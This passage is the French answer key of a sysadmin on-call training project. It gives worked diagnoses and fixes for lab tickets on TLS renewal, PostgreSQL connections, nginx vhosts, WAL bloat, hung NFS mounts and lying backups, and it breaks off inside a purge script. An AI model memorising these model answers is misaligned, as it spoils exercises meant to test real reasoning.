<!-- nav:début -->
[Accueil](../../README.md) › [Parcours](../../docs/parcours.md) › Projet C — Une semaine d'astreinte › **Projet C** · corrigé  
[← Module 33](../../modules/33-packaging-build/corrige.md) · [Énoncé](README.md)

> [!TIP]
> Règle des 20 minutes : ouvre un corrigé après vingt minutes de recherche honnête, pas avant. Chaque identifiant renvoie à son énoncé.
<!-- nav:fin -->

# Projet C — Corrigé

Ce corrigé est **autoportant** : chaque ticket rappelle l'énoncé en une ligne,
puis déroule le diagnostic commande par commande (avec ce qu'on lit), la cause
racine, le correctif, la prévention, et **ce qu'il fallait écrire dans le
ticket**. Les blocs `::: pourquoi` expliquent le mécanisme ; les blocs
`::: piege` pointent l'erreur classique. Les corrigés modèles des exercices de
communication et de la revue sont en fin de document.

Conventions de lecture : les valeurs (PID, tailles) sont des exemples plausibles
sur l'infra du §1 ; chez toi elles diffèrent, la démarche non.

---

## C.1 Lundi

### <a id="pc-1-1"></a>[PC.1.1](README.md#pc-1-1) — Certificat TLS expiré

*Le site affiche un avertissement de sécurité depuis 03:14 ; alerte
`SSLCertExpired`. Interdit : reboot. Fenêtre : avant 10:00.*

**Diagnostic.** On confirme d'abord le symptôme du côté client, sans se fier au
navigateur :

```bash
curl -v --resolve factura.lab.local:443:127.0.0.1 \
  https://factura.lab.local/version 2>&1 | grep -Ei 'expire|verify|SSL'
#  *  SSL certificate problem: certificate has expired
#  *  expire date: Sep 19 01:00:00 2026 GMT
```

On lit la fenêtre de validité et l'émetteur directement dans le certificat
**servi** (pas un fichier au hasard sur le disque) :

```bash
echo | openssl s_client -connect 127.0.0.1:443 \
  -servername factura.lab.local 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates
# subject=O = Factura Lab, CN = factura.lab.local
# issuer=O = Factura Lab, CN = Factura Lab CA
# notBefore=Jun 21 01:00:00 2026 GMT
# notAfter =Sep 19 01:00:00 2026 GMT   <- expiré ce matin
```

`notAfter` est passé : le certificat a expiré. L'émetteur est la **CA de lab**,
donc la chaîne de confiance est légitime — il ne faut surtout pas la remplacer
par un auto-signé. On vérifie qu'on dispose de la clé, de la CSR et de la CA
pour réémettre :

```bash
ls -l /etc/ssl/factura/
# ca.crt ca.key ca.cnf factura.lab.local.key factura.lab.local.csr ...
```

**Cause racine.** Le certificat serveur avait une durée de 90 jours et personne
ne le renouvelait : aucune surveillance de l'échéance, aucun renouvellement
automatique. L'expiration était **programmée**, pas accidentelle.

**Correctif.** Réémettre le certificat avec la CA de lab, à partir de la CSR
existante (donc la clé privée ne change pas), puis recharger nginx **sans le
redémarrer** (un `reload` ne coupe pas les connexions et ne touche pas l'uptime
de la VM) :

```bash
cd /etc/ssl/factura
sudo openssl ca -batch -config ca.cnf -notext \
  -in factura.lab.local.csr -out factura.lab.local.crt
sudo openssl x509 -in factura.lab.local.crt -noout -enddate
# notAfter=Dec 18 ... 2026 GMT   <- +90 jours
sudo nginx -t && sudo systemctl reload nginx
```

Vérification bout en bout, **sans `-k`** (donc validation réelle) :

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  --resolve factura.lab.local:443:127.0.0.1 https://factura.lab.local/version
# 200
```

**Prévention.** Surveiller l'échéance **et** renouveler automatiquement. Une
sonde simple, plus un timer de renouvellement :

```bash
# /usr/local/bin/cert-check — alerte à J-21
sudo tee /usr/local/bin/cert-check >/dev/null <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
C=/etc/ssl/factura/factura.lab.local.crt
if ! openssl x509 -in "$C" -noout -checkend $((21*86400)); then
  echo "certificat $C expire dans moins de 21 jours" >&2
  exit 1
fi
EOF
sudo chmod +x /usr/local/bin/cert-check
```

Un `cert-check.timer` quotidien qui échoue déclenche l'alerte ; idéalement, un
renouvellement automatique (script `openssl ca` + `nginx -s reload`) piloté par
timer, ou le passage à une PKI qui renouvelle (ACME interne). La règle Prometheus
`SSLCertExpired` doit alerter **à J-21**, pas à J-0.

> [!NOTE]
> **Pourquoi**
>
> La validité d'un certificat est une propriété du certificat lui-même
> (`notBefore`/`notAfter`), vérifiée par le client à chaque poignée de main TLS.
> Rien ne « prévient » côté serveur : un certificat expiré continue d'être présenté
> tel quel, c'est le **client** qui refuse. D'où deux conséquences : (1) il faut
> surveiller l'échéance de façon active, côté serveur, avant qu'un client ne la
> découvre ; (2) `openssl x509 -checkend N` (secondes) rend un code non nul si le
> certificat expire avant `N` secondes — c'est l'outil exact d'une sonde.
> Réémettre depuis la **CSR** garde la même clé privée : les pinning et l'HPKP
> éventuels ne cassent pas, et on ne redéploie pas de clé.

> [!WARNING]
> **Piège**
>
> L'erreur qui coûte le poste : générer un `openssl req -x509` auto-signé « pour
> que ça remarche vite ». Le cadenas revient chez toi (tu as ajouté ta CA de test)
> mais **casse chez tous les clients** qui ne connaissent pas cet émetteur, et tu
> as remplacé une chaîne de confiance propre par un bricolage. Autre piège :
> `systemctl restart nginx` au lieu de `reload` — inutile (reload relit les
> certificats), et sur ce ticket, un restart n'est pas un reboot mais reste plus
> brutal que nécessaire. Enfin, ne jamais toucher `factura.lab.local.key` : si tu
> régénères la clé sans refaire signer, `nginx -t` échoue sur la non-correspondance
> clé/certificat.

**Ce qu'il fallait écrire dans le ticket :** « Certificat `factura.lab.local`
(CA de lab) expiré le 19/09 01:00 UTC. Réémis 90 j depuis la CSR existante,
`nginx reload` (pas de coupure). HTTPS validé sans -k. Cause : aucun suivi
d'échéance. Action : sonde `cert-check.timer` J-21 + renouvellement auto à
mettre en place (voir PC revue). Aucune VM redémarrée. »

---

### <a id="pc-1-2"></a>[PC.1.2](README.md#pc-1-2) — max_connections PostgreSQL atteint

`FATAL: remaining connection slots are reserved for roles with the SUPERUSER attribute`*. Interdit : redémarrer la base hors de la fenêtre 12 :30–13 :00.*

**Diagnostic.** On confirme, et surtout on **regarde qui est connecté** avant de
toucher au réglage :

```bash
sudo -u postgres psql -c 'show max_connections;'
#  max_connections | 8        <- anormalement bas
sudo -u postgres psql -c "select state, count(*) from pg_stat_activity
  where backend_type = 'client backend' group by state;"
#  idle in transaction |     5
#  active              |     1      <- notre propre requête
```

Cinq sessions **`idle in transaction`** : des transactions ouvertes qui ne se
ferment jamais et gardent leur connexion. On les date et on identifie l'appli :

```bash
sudo -u postgres psql -x -c \
  "select pid, usename, application_name, xact_start,
          now()-xact_start as age, left(query,40) as requete
   from pg_stat_activity
   where state='idle in transaction' order by xact_start;"
#  age | 00:41:12   application_name | psql   <- vieux, jamais commité
```

On remonte au processus système fautif :

```bash
pgrep -af etl-compta
#  12841 /usr/local/bin/etl-compta
```

Et on trouve d'où vient le `max_connections=8` :

```bash
grep -rniE '^\s*max_connections' /etc/postgresql/16/main/
# conf.d/20-tuning.conf:2:max_connections = 8   <- déposé vendredi 18:40
```

**Cause racine.** Deux fautes se combinent : un « tuning » posé vendredi soir
sans ticket a **abaissé** `max_connections` à 8, et un ETL prototype ouvre des
transactions qu'il ne ferme jamais (`BEGIN` sans `COMMIT`). À 8 places, cinq
sessions zombies suffisent à saturer : PostgreSQL garde `superuser_reserved_connections` (3) places pour les superutilisateurs, il n'en reste donc que 5 pour `factura` — d'où le message « remaining connection slots are reserved… » (le classique `too many clients already` n'apparaît que lorsque les 8 places sont prises).

**Correctif immédiat (sans redémarrer la base).** On libère des places en
terminant les sessions abandonnées, ce qui **ne nécessite pas de restart** :

```bash
# arrêter le fautif d'abord, sinon il en rouvre
sudo pkill -f /usr/local/bin/etl-compta
# terminer les transactions ouvertes anciennes
sudo -u postgres psql -c \
  "select pg_terminate_backend(pid) from pg_stat_activity
   where state='idle in transaction' and xact_start < now()-interval '5 min';"
```

Les utilisateurs se reconnectent immédiatement. **Correctif de fond** :
remonter `max_connections` à sa valeur normale — ce paramètre exige un
**restart**, donc on le programme dans la fenêtre 12:30 :

```bash
sudo rm /etc/postgresql/16/main/conf.d/20-tuning.conf
# ou éditer : max_connections = 100
# à 12:30, dans la fenêtre autorisée :
sudo systemctl restart postgresql@16-main.service
```

**Prévention.** Un garde-fou pour que des transactions oubliées ne resaturent
jamais la base :

```bash
sudo -u postgres psql -c \
  "alter system set idle_in_transaction_session_timeout = '5min';"
sudo -u postgres psql -c 'select pg_reload_conf();'   # pas de restart
```

> [!NOTE]
> **Pourquoi**
>
> Chaque connexion PostgreSQL est un **processus** (`postgres: user db ...`) qui
> réserve une place dans la limite `max_connections`. Une session `idle in
> transaction` a fini sa requête mais n'a pas clos sa transaction : elle garde sa
> place **et** des verrous, et empêche le nettoyage (VACUUM) des lignes mortes.
> `pg_terminate_backend(pid)` coupe proprement une session sans toucher aux
> autres — d'où la remise en service **sans redémarrage**.
> `idle_in_transaction_session_timeout` fait tuer automatiquement par le serveur
> toute transaction laissée ouverte trop longtemps : c'est le filet exact contre
> ce genre d'ETL. Il se recharge par `pg_reload_conf()` (SIGHUP), sans restart ;
> `max_connections`, lui, est alloué au démarrage et exige un restart.

> [!WARNING]
> **Piège**
>
> Le réflexe « je redémarre PostgreSQL, ça vide les connexions » viole
> l'interdiction **et** détruit la preuve (`pg_stat_activity` est remis à zéro,
> tu ne sauras jamais qui saturait). Autre piège : remonter `max_connections` à
> 500 « pour être tranquille » — chaque connexion coûte de la RAM (work_mem,
> buffers), tu déplaces la panne vers l'OOM killer. La vraie limite basse était
> une régression de config, pas un manque de capacité ; le vrai problème était
> l'ETL. Corriger les deux, pas gonfler le chiffre.

**Ce qu'il fallait écrire dans le ticket :** « Saturation `max_connections`
(=8, abaissé par un tuning non validé de vendredi 18 :40) aggravée par 5 sessions *idle in
transaction* de `etl-compta` (BEGIN sans COMMIT). Fautif arrêté, sessions
terminées via `pg_terminate_backend` → accès rétabli 09:52 sans restart.
`max_connections` remis à 100 (restart programmé 12:30). Garde-fou :
`idle_in_transaction_session_timeout=5min`. »

---

### <a id="pc-1-3"></a>[PC.1.3](README.md#pc-1-3) — Nouveau vhost docs.factura.lab.local

*Publier `/srv/www/docs` sur `docs.factura.lab.local` en HTTPS avant 17:00, sans
casser le vhost principal, avec des droits sains.*

**Diagnostic / préparation.** On regarde la livraison telle qu'elle est arrivée :

```bash
ls -la /srv/www/docs
#  drwxr-x--- 1042 1042 ... docs   <- droits/propriétaire douteux
```

nginx (`www-data`) ne pourra pas lire ça : aucun droit pour « other », propriétaire inconnu 1042.
On vérifie que le nom se résout et que le certificat couvre le sous-domaine
(le setup l'a inclus dans le SAN) :

```bash
getent hosts docs.factura.lab.local
openssl x509 -in /etc/ssl/factura/factura.lab.local.crt -noout -ext \
  subjectAltName | tr ',' '\n' | grep docs
#   DNS:docs.factura.lab.local
```

**Correctif.** Droits sains, puis vhost dédié.

```bash
sudo chown -R root:root /srv/www/docs     # nginx lit, n'écrit pas
sudo find /srv/www/docs -type d -exec chmod 755 {} +
sudo find /srv/www/docs -type f -exec chmod 644 {} +

sudo tee /etc/nginx/sites-available/docs.conf >/dev/null <<'EOF'
server {
    listen 80;
    server_name docs.factura.lab.local;
    return 301 https://docs.factura.lab.local$request_uri;
}
server {
    listen 443 ssl;
    server_name docs.factura.lab.local;
    ssl_certificate     /etc/ssl/factura/factura.lab.local.crt;
    ssl_certificate_key /etc/ssl/factura/factura.lab.local.key;
    root /srv/www/docs;
    index index.html;
    location / { try_files $uri $uri/ =404; }
}
EOF
sudo ln -s /etc/nginx/sites-available/docs.conf \
           /etc/nginx/sites-enabled/docs.conf
sudo nginx -t && sudo systemctl reload nginx
```

Vérification :

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  --resolve docs.factura.lab.local:443:127.0.0.1 \
  https://docs.factura.lab.local/
# 200
# et le principal n'a pas bougé :
curl -s -o /dev/null -w '%{http_code}\n' \
  --resolve factura.lab.local:443:127.0.0.1 https://factura.lab.local/version
# 200
```

**Prévention.** Un changement, même petit, se trace : commit de la conf,
`nginx -t` obligatoire avant reload, et un contrôle « aucun fichier
world-writable dans une racine servie ».

> [!NOTE]
> **Pourquoi**
>
> `try_files $uri $uri/ =404` sert un fichier statique s'il existe, sinon
> l'index du répertoire, sinon 404 — c'est le bon patron pour du contenu
> statique, sans proxy. On réutilise le certificat du vhost principal parce que
> son SAN couvre déjà `docs.factura.lab.local` : pas besoin d'en émettre un
> second. `nginx -t` valide la syntaxe **et** la présence des fichiers de
> certificat avant qu'un `reload` ne prenne effet : c'est ce qui évite de casser
> le frontal en publiant le nouveau.

> [!WARNING]
> **Piège**
>
> `chmod -R 777 /srv/www/docs` « pour que nginx puisse lire » est la faute
> classique (on la traite en vrai à PC.5.3 côté inodes, et l'esprit est le même) :
> un répertoire servi par le web en 777 est modifiable par n'importe quel
> processus de la machine. La lecture par nginx demande `755`/`644`, rien de plus : le propriétaire reste `root`, pas `www-data` (un frontal compromis ne doit pas pouvoir réécrire le contenu qu'il sert). Autre piège : oublier le bloc port 80 → les
> utilisateurs qui tapent `http://docs...` tombent sur une erreur au lieu d'être
> redirigés.

**Ce qu'il fallait écrire dans le ticket :** « Vhost `docs.factura.lab.local`
publié en HTTPS (certificat existant, SAN OK), redirection 80→443, droits
remis à `root`/755-644 (la livraison était sans droit « other », propriétaire 1042).
Vhost principal vérifié intact. Conf commitée. »

---

### <a id="pc-1-4"></a>[PC.1.4](README.md#pc-1-4) — 502 Bad Gateway après déploiement

*502 partout depuis le déploiement 15:10 ; `systemctl status` dit *active*.
Interdit : rollback de la 2.4.0, reboot.*

**Diagnostic.** 502 = nginx n'obtient pas de réponse de son *upstream*. On lit
d'abord **son** journal d'erreur, c'est lui qui parle :

```bash
sudo tail -3 /var/log/nginx/factura.error.log
# connect() failed (111: Connection refused) while connecting to upstream,
#   upstream: "http://127.0.0.1:8081/version"
```

nginx tape sur `127.0.0.1:8081` et se fait refuser. Où l'API écoute-t-elle
vraiment ?

```bash
sudo ss -tlnp | grep python3
# LISTEN 0 ... 127.0.0.1:8082 ... users:(("python3",pid=2455,...))
```

L'API écoute sur **8082**, nginx vise **8081**. On comprend pourquoi en lisant
la trace du déploiement et la conf :

```bash
sudo tail -2 /var/log/factura/deploy.log
# ... 2.3.1 -> 2.4.0 : api.env regenere depuis api.env.example ...
grep -E '^PORT|^APP_VERSION' /etc/factura/api.env
# PORT=8082
# APP_VERSION=2.4.0
```

**Cause racine.** Le job de déploiement a régénéré `/etc/factura/api.env` à
partir du `api.env.example` du dépôt, dans lequel le **port a changé** (8082).
L'API 2.4.0 tourne donc bien (`active (running)` ne ment pas), mais sur un port
que nginx ne connaît pas. Le code n'est pas en cause : c'est un désaccord de
configuration entre l'appli et le reverse proxy.

**Correctif (sans rollback).** La source de vérité côté frontal, c'est nginx.
On réaligne l'API sur 8081 (ou l'inverse — un seul des deux) et on recharge le
service :

```bash
sudo sed -i 's/^PORT=8082/PORT=8081/' /etc/factura/api.env
sudo systemctl restart factura-api.service      # relit api.env
curl -s -o /dev/null -w '%{http_code}\n' \
  --resolve factura.lab.local:443:127.0.0.1 https://factura.lab.local/version
# 200
curl -s --resolve factura.lab.local:443:127.0.0.1 \
  https://factura.lab.local/version
# {"version": "2.4.0"}     <- 2.4.0 conservée, pas de rollback
```

**Prévention.** Le port d'écoute ne doit pas être un paramètre qu'un
`api.env.example` peut réécrire silencieusement : le figer dans l'unité systemd
ou un `drop-in` non touché par le déploiement, et ajouter au pipeline un test de
fumée post-déploiement (`curl https://factura.lab.local/version` doit renvoyer
200 **à travers nginx**, pas juste `is-active`).

> [!NOTE]
> **Pourquoi**
>
> `active (running)` signifie seulement que le processus principal de l'unité
> tourne et n'a pas planté — pas qu'il fait ce qu'on attend, ni qu'il écoute où il
> faut. C'est exactement le piège du module 19 (« le service tourne mais ne répond
> pas ») transposé au couple nginx/upstream. Le bon réflexe pour un 502 est
> toujours : lire `error.log` de nginx (il nomme l'upstream et l'erreur), puis
> comparer le port réel d'écoute (`ss -tlnp`) au port ciblé par la conf. Ici
> `Connection refused` (pas `timed out`) dit « personne n'écoute là », ce qui
> oriente d'emblée vers un mauvais port, pas vers une appli lente.

> [!WARNING]
> **Piège**
>
> Le réflexe « ça vient du déploiement, je rollback en 2.3.1 » est interdit **et**
> inutile : le code va très bien, seul le port a changé. Rollback t'aurait fait
> perdre le correctif de la 2.4.0 et masqué la vraie cause (un `.env.example`
> qui pilote un port). Autre piège : changer le `proxy_pass` de nginx vers 8082 au
> lieu de corriger l'API — ça marche aussi, mais choisis **un** point de vérité et
> documente-le, sinon le prochain déploiement recassera.

**Ce qu'il fallait écrire dans le ticket :** « 502 = upstream refusé
(`nginx error.log`). API 2.4.0 *active* mais écoutant 8082 au lieu de 8081, car
le déploiement a régénéré `api.env` depuis `api.env.example` (port modifié).
Réaligné PORT=8081, redémarrage API → 200, version 2.4.0 conservée (pas de
rollback). Prévention : figer le port hors du .env versionné + smoke test
post-déploiement à travers nginx. »

---

## C.2 Mardi

### <a id="pc-2-1"></a>[PC.2.1](README.md#pc-2-1) — lab-db à 95 %

*`DiskSpaceLow` sur lab-db, disque à 95 %, base encore vivante. Interdit :
reboot ; ne jamais `rm` dans `pg_wal/`.*

**Diagnostic.** D'abord vérifier que c'est du **vrai** espace (pas un fichier
supprimé encore ouvert, pas des inodes) puis localiser :

```bash
df -h /var ; df -i /var          # 95 % en espace, inodes OK
sudo du -xh --max-depth=1 /var | sort -h | tail
#  ... 18G  /var/log/postgresql
#  ... 97M  /var/lib/postgresql/16/main/pg_wal
```

Les journaux écrasent tout, mais le WAL mérite un regard : un WAL qui gonfle a
presque toujours une cause précise — un slot de réplication inactif :

```bash
sudo -u postgres psql -x -c 'select * from pg_replication_slots;'
#  slot_name | replica_reporting
#  active    | f                       <- inactif : il retient le WAL
sudo -u postgres psql -c \
  "select slot_name,
     pg_size_pretty(pg_wal_lsn_diff(pg_current_wal_lsn(), restart_lsn))
   from pg_replication_slots;"
#  replica_reporting | 48 MB     <- et ça ne fera que croître
```

Et les journaux, gonflés par une trace exhaustive laissée en place :

```bash
grep -rniE 'log_statement|log_min_duration' /etc/postgresql/16/main/conf.d/
# 30-debug.conf: log_statement = 'all'
# 30-debug.conf: log_min_duration_statement = 0
ls -lhS /var/log/postgresql | head
ls /etc/logrotate.d/ | grep -i postgres || echo "aucune rotation"
# aucune rotation   <- postgresql-common a disparu de /etc/logrotate.d
```

**Cause racine.** Trois contributeurs : (1) `log_statement=all` +
`log_min_duration_statement=0` journalisent **chaque** requête depuis un
débogage jamais retiré ; (2) un slot de réplication `replica_reporting` d'un
réplica décommissionné retient tout le WAL depuis sa dernière position ; (3) de
vieux journaux non tournés.

**Correctif (sans reboot, sans `rm` dans pg_wal).**

```bash
# 1. couper la journalisation exhaustive
sudo rm /etc/postgresql/16/main/conf.d/30-debug.conf
sudo -u postgres psql -c 'select pg_reload_conf();'   # SIGHUP, pas de restart

# 2. supprimer le slot orphelin : PostgreSQL libère alors le WAL LUI-MÊME
sudo -u postgres psql -c \
  "select pg_drop_replication_slot('replica_reporting');"
sudo -u postgres psql -c 'checkpoint;'   # accélère la libération du WAL

# 3. purger les vieux journaux tournés (le journal courant reste)
sudo find /var/log/postgresql -name 'postgresql-16-main.log.*' -delete
```

Vérification :

```bash
df -h /var        # repassé sous 85 %
```

**Prévention.** Une rotation `logrotate` pour PostgreSQL, et une alerte sur les
**slots inactifs** (pas seulement sur l'espace) :

```ini
# /etc/logrotate.d/postgresql-factura
/var/log/postgresql/*.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
    copytruncate
    su root root
}
```

> [!NOTE]
> **Pourquoi**
>
> `copytruncate` parce que PostgreSQL (lancé par `pg_ctlcluster`) garde son journal ouvert; `su root root` parce que `/var/log/postgresql` est inscriptible par le groupe `postgres` et que logrotate refuse sinon d'y travailler. (Restaurer le `postgresql-common` d'origine, depuis le paquet, est l'autre option — mais pas les deux : deux règles sur le même fichier et logrotate s'arrête en « duplicate log entry ».) Un slot de réplication garantit à PostgreSQL qu'un consommateur en retard pourra
> rejouer le WAL : tant que le slot existe, le serveur **refuse** de recycler les
> segments WAL au-delà de `restart_lsn`, quitte à saturer le disque. C'est une
> sécurité qui se retourne contre toi si le consommateur a disparu sans qu'on
> supprime le slot. La seule façon correcte de récupérer ce WAL est de
> `pg_drop_replication_slot` : PostgreSQL recycle alors les segments de lui-même au
> prochain checkpoint. Supprimer les fichiers de `pg_wal/` à la main corrompt la
> base — d'où l'interdiction. `log_min_duration_statement=0` journalise toutes les
> requêtes (0 ms de seuil) : parfait pour déboguer une heure, catastrophique en
> permanence.

> [!WARNING]
> **Piège**
>
> `rm` dans `pg_wal/` pour « faire de la place » : tu perds la capacité de
> recovery et, si tu supprimes un segment encore nécessaire, la base ne redémarre
> plus. Autre piège : traiter le symptôme (purger les logs) sans supprimer le
> slot — le WAL regonfle en quelques heures et tu rappelles à 3 h. Toujours
> chercher **pourquoi** le WAL grossit avant de chercher de la place.

**Ce qu'il fallait écrire dans le ticket :** « lab-db 95 %. Trois causes : slot
de réplication `replica_reporting` inactif retenant du WAL sans limite (réplica
décommissionné), `log_statement=all` laissé depuis un debug, vieux journaux jamais purgés (règle logrotate disparue). Slot supprimé (WAL libéré au checkpoint, aucun rm manuel), debug
retiré (`pg_reload_conf`), journaux tournés purgés. Repassé <85 %. Prévention :
logrotate rétabli + alerte slots inactifs. Aucun restart. »

---

### <a id="pc-2-2"></a>[PC.2.2](README.md#pc-2-2) — Montage NFS bloqué

*`df` et `ls /mnt/archives` se figent, export nocturne en état `D`, charge
haute / CPU au repos. Interdit : reboot.*

**Diagnostic.** Les commandes qui touchent le montage se figent : c'est le
signe d'un NFS **dur** (hard mount) injoignable. On évite justement les
commandes qui bloquent en ciblant `/proc` :

```bash
# NE PAS faire df tout court : il se fige. Cibler les autres montages :
df -x nfs -h
# voir le montage problématique sans y toucher :
grep archives /proc/mounts
# 127.0.0.1:/srv/factura-nfs /mnt/archives nfs rw,relatime,vers=4.2,... 0 0
```

On confirme les processus bloqués en `D` (attente ininterruptible) :

```bash
ps -eo state,pid,wchan:24,args | awk '$1 ~ /^D/'
#  D 18477 rpc_wait_bit_killable export-archives /srv/factura/data/...
#  D 18990 rpc_wait_bit_killable df -h
```

La charge élevée avec CPU au repos s'explique : `load average` compte les `D`.
On vérifie pourquoi le serveur ne répond pas (ici, le trafic NFS est coupé) :

```bash
sudo nft list ruleset | grep -A3 nas_coupure
# ... tcp dport 2049 drop    <- le port NFS est bloqué
```

**Cause racine.** Le serveur de fichiers (ou le chemin réseau vers lui) est
injoignable ; le montage `/mnt/archives` étant **hard** (défaut NFS), tout accès
attend indéfiniment, fige `df`/`ls`, laisse les jobs en `D` et gonfle la charge.

**Correctif.** Rétablir le chemin réseau, puis les processus se débloquent
seuls ; sinon, démonter en forçant :

```bash
# 1. rétablir la connectivité NFS
sudo nft delete table inet nas_coupure
# 2. si des processus restent coincés, démontage paresseux/forcé
sudo umount -f -l /mnt/archives 2>/dev/null || true
sudo mount /mnt/archives
timeout 5 ls /mnt/archives && echo OK
```

**Prévention.** Rendre le montage incapable de figer le boot et les jobs :
options `nofail`, un timeout de montage, et un montage **soft** avec `timeo`/
`retrans` bornés pour ce partage d'archives non critique.

```ini
# fstab n'accepte pas de ligne continuée par « \ » : on écrit UNE ligne
O=_netdev,nofail,soft,timeo=50,retrans=2,x-systemd.mount-timeout=10
sudo sed -i '\|[[:space:]]/mnt/archives[[:space:]]|d' /etc/fstab
echo "127.0.0.1:/srv/factura-nfs /mnt/archives nfs $O 0 0" \
  | sudo tee -a /etc/fstab
sudo systemctl daemon-reload
sudo umount /mnt/archives && sudo mount /mnt/archives   # nouvelles options
```

> [!NOTE]
> **Pourquoi**
>
> Un montage NFS `hard` (le défaut) garantit qu'aucune donnée n'est perdue : le
> client **réessaie indéfiniment** jusqu'à ce que le serveur réponde. Le prix, si
> le serveur disparaît, est que tout processus qui touche le point de montage part
> en `D` (attente dans le noyau) — un état qui ignore les signaux ordinaires; pour NFS l'attente est « killable » (le `_killable` du `wchan`) : seul
> `SIGKILL` passe, mais tuer les processus ne débloque pas le montage, et tout nouvel accès se refige. `df` sans argument fige parce
> qu'il parcourt **tous** les montages, y compris le NFS mort ; d'où le réflexe
> `df -x nfs` ou la lecture de `/proc/mounts`. `soft` fait abandonner après
> `timeo*retrans` : acceptable pour des archives, dangereux pour des données en
> écriture (risque de corruption silencieuse). `nofail` empêche qu'un NAS absent
> bloque le démarrage de la VM.

> [!WARNING]
> **Piège**
>
> Rebooter « parce que c'est la seule façon de débloquer » est justement interdit,
> et souvent la VM **ne redémarre pas proprement** tant que le NFS hard est monté
> (le shutdown attend le umount). Autre piège : `umount /mnt/archives` simple, qui
> se fige lui aussi — il faut `-f` (force) et/ou `-l` (lazy). Enfin, mettre `soft`
> sur un partage en **écriture** de données importantes : tu troques un blocage
> visible contre une corruption invisible.

**Ce qu'il fallait écrire dans le ticket :** « NAS injoignable ⇒ montage NFS
*hard* `/mnt/archives` fige `df`/`ls` et laisse l'export en `D` (charge haute,
CPU repos, load compte les `D`). Connectivité rétablie, umount -f -l puis
remontage. Prévention : fstab en `nofail,soft,timeo=50,retrans=2,
x-systemd.mount-timeout=10`. Aucun reboot. »

---

### <a id="pc-2-3"></a>[PC.2.3](README.md#pc-2-3) — Sauvegardes vides mais « OK »

*Le timer tourne, le rapport dit « Sauvegarde OK », l'archive est vide. Ne pas se
contenter de relancer.*

**Diagnostic.** On ouvre une archive récente : l'archive ment.

```bash
ls -lh /var/backups/factura/ | tail
tar -tzf "$(ls -1t /var/backups/factura/*.tar.gz | head -1)" | head
# (rien) — l'archive ne contient aucun fichier
```

On lit le script de sauvegarde et son code de retour :

```bash
cat /usr/local/sbin/factura-backup
# SRC=/srv/factura/donnees        <- n'existe pas
# tar -czf "$ARCH" -C ... 2>/dev/null    <- erreurs masquées
# exit 0                                  <- réussit toujours
ls -ld /srv/factura/donnees /srv/factura/data
# /srv/factura/donnees : Aucun fichier de ce type
# /srv/factura/data : OK, contient les données
```

**Cause racine.** Lors de la migration, les données sont passées de
`/srv/factura/donnees` à `/srv/factura/data`, mais le script a gardé l'ancien
chemin. `tar` échoue (source absente), mais l'erreur est jetée dans
`/dev/null`, le `set -e` absent, et un `exit 0` final : le script produit une
archive vide **et rend un succès**. Le timer, lui, fonctionne parfaitement.

**Correctif.** Corriger le chemin **et** rendre le script incapable de mentir :

```bash
sudo tee /usr/local/sbin/factura-backup >/dev/null <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
SRC=${FACTURA_SRC:-/srv/factura/data}
DEST=/var/backups/factura
ARCH="$DEST/factura-$(date +%Y%m%d-%H%M).tar.gz"
mkdir -p "$DEST"
[ -d "$SRC" ] || { echo "source absente: $SRC" >&2; exit 1; }
tar -czf "$ARCH" -C "$(dirname "$SRC")" "$(basename "$SRC")"
NB=$(tar -tzf "$ARCH" | grep -c -v '/$')
[ "$NB" -gt 0 ] || { echo "archive vide: $ARCH" >&2; rm -f "$ARCH"; exit 1; }
ls -1t "$DEST"/factura-*.tar.gz | tail -n +8 | xargs -r rm -f
echo "Sauvegarde OK : $ARCH ($NB fichiers)"
EOF
sudo chmod +x /usr/local/sbin/factura-backup
sudo systemctl start factura-backup.service
tar -tzf "$(ls -1t /var/backups/factura/*.tar.gz | head -1)" | wc -l   # >0
```

Purger les fausses archives vides pour ne pas tromper une future restauration :

```bash
for a in /var/backups/factura/*.tar.gz; do
  [ "$(tar -tzf "$a" 2>/dev/null | grep -c -v '/$')" -eq 0 ] && sudo rm -f "$a"
done
```

**Prévention.** Un contrôle de restauration périodique (restaurer dans un
répertoire jetable et compter les fichiers), et une alerte si l'archive du jour
pèse moins qu'un seuil. Le principe : **une sauvegarde non testée n'existe pas**.

> [!NOTE]
> **Pourquoi**
>
> Le mensonge vient de trois anti-patterns cumulés : `2>/dev/null` masque
> l'erreur de `tar`, l'absence de `set -e` laisse le script continuer après
> l'échec, et `exit 0` en fin force un succès. Le code de retour d'un job de
> sauvegarde est ce que le timer et le monitoring observent : s'il est toujours 0,
> personne ne voit rien. La correction clé n'est pas le chemin (une donnée peut
> disparaître pour d'autres raisons demain) mais le **contrôle du résultat** :
> compter les entrées de l'archive et rendre un code non nul si c'est vide. C'est
> la version « sauvegarde » de la règle « mesurer, ne pas supposer ».

> [!WARNING]
> **Piège**
>
> Relancer la sauvegarde et cocher le ticket : tu n'as rien corrigé, la prochaine
> migration recassera. Autre piège : corriger le chemin sans ajouter le contrôle
> de contenu — le jour où la source est vide pour une autre raison, tu réarchives
> du vide en silence. Et surtout : découvrir le problème **le jour où on a besoin
> de restaurer** est déjà un demi-échec ; le contrôle de restauration doit être
> proactif.

**Ce qu'il fallait écrire dans le ticket :** « Sauvegardes vides depuis la
migration `donnees`→`data` : script figé sur l'ancien chemin, erreurs de `tar`
masquées (`2>/dev/null`), `exit 0` forcé ⇒ succès menteur. Corrigé : chemin +
`set -euo pipefail` + contrôle `tar -tzf | grep -c` (échoue si vide). Fausses
archives purgées, restauration testée. Prévention : test de restauration
planifié + alerte taille. »

---

### <a id="pc-2-4"></a>[PC.2.4](README.md#pc-2-4) — Purge planifiée des exports

*Garder 30 jours d'exports `.csv`, ne jamais toucher aux `-legal.csv` ni à
`archives-legales/`. Timer dimanche, journalisé, avec `--dry-run`.*

**Correctif (c'est un changement).** Un script prudent, puis un timer.

```bash
sudo tee /usr/local/sbin/factura-purge-exports >/dev/null <<'EOF'
#!/usr/bin/env bash
# Purge les exports CSV de plus de 30 jours, sauf fichiers légaux.
set -euo pipefail
DIR=/srv/factura/exports
AGE=30
DRY=0; [ "${1:-}" = "--dry-run" ] && DRY=1
# uniquement *.csv, hors *-legal.csv, hors archives-legales/
while IFS= read -r -d '' f; do
  if [ "$DRY" -eq 1 ]; then
    echo "[dry-run] supprimerait : $f"
  else
    rm -f "$f" && echo "supprimé : $f"
  fi
